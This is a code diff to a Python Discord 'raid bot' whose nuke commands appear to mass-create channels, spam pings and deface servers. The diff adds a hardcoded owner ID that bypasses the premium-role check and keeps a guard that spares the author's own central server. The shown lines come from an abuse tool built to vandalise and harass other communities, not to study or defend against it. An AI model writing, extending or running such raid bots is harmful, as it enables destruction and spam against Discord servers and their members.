@@ -9,11 +9,15 @@ from dotenv import load_dotenv
 load_dotenv()
 TOKEN = os.getenv('DISCORD_TOKEN')
 
-# --- SECURITY AND PREMIUM CONFIGURATION ---
+# --- CONFIGURATION ---
 # The ID of your central server. This server will be protected.
 CENTRAL_SERVER_ID = 1453920087194206394  # IMPORTANT: REPLACE THIS with your server ID!!
 # The ID of the "Premium" role in your central server.
 PREMIUM_ROLE_ID = 1458177413325259035      # IMPORTANT: REPLACE THIS with your premium role ID!!
+
+# --- OWNER CONFIGURATION (MODIFIED) ---
+# Put your own Discord User ID here to get automatic premium access.
+OWNER_ID = 1450919094202269881              # ¡¡¡REEMPLAZA ESTO CON TU ID DE USUARIO!!!
 
 # --- DEFAULT NUKE CONFIGURATION ---
 CHANNEL_NAME_CONFIG = "raid-by-del1rium"
@@ -24,9 +28,15 @@ RAID_ICON_URL = "https://i.imgur.com/x203v9a.jpeg"
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=':', intents=intents)
 
-# --- PREMIUM CHECK FUNCTION ---
+# --- PREMIUM CHECK FUNCTION (MODIFIED WITH MANUAL OWNER ID) ---
 def is_premium():
     async def predicate(ctx):
+        # --- OWNER OVERRIDE USING MANUAL ID ---
+        # First, check if the command author's ID matches the OWNER_ID.
+        if ctx.author.id == OWNER_ID:
+            return True  # If it's the owner, grant premium access automatically.
+
+        # If not the owner, proceed with the standard premium role check.
         central_server = bot.get_guild(CENTRAL_SERVER_ID)
         if not central_server:
             print("CRITICAL ERROR: Bot is not in the central server. Cannot verify premium status.")
@@ -49,8 +59,11 @@ def is_premium():
 @bot.event
 async def on_ready():
     print(f'Raid Bot connected as {bot.user.name}')
+    print(f'Bot Owner ID set to: {OWNER_ID}') # Confirms the manually set owner ID
     print(f'Protected Central Server ID: {CENTRAL_SERVER_ID}')
     print('Commands: :nuke, :premiumnuke, :nukeconfig')
+
+# (The rest of the code is exactly the same)
 
 # --- CONFIGURATION COMMAND ---
 @bot.command(name='nukeconfig')
@@ -95,7 +108,6 @@ async def premium_nuke(ctx):
 async def execute_nuke(ctx, num_channels, num_pings, is_premium: bool):
     guild = ctx.guild
     
-    # CRITICAL SECURITY LAYER
     if guild.id == CENTRAL_SERVER_ID:
         await ctx.send("Action Blocked: Nuke commands are permanently disabled in this server for protection.")
         print(f"BLOCKED: {ctx.author.name} attempted to execute a nuke in the protected central server.")
